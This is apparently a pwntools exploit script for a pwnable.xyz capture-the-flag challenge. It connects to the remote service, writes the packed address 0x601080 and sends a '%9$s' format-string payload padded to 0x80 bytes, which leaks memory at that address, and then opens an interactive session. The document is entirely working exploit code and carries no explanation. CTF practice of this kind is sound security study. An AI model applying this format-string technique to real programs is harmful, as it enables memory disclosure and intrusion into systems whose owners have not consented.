from pwn import *

p = connect('svc.pwnable.xyz', 30004)

print p.readuntil(': ')
p.write('yABCABCA'+p64(0x601080))

payload = 'A'*32
payload += '%9$s'
payload += 'A'*(0x80-len(payload))

print p.readuntil(': ')
p.write(payload)


print p.readuntil('AA')

p.interactive()
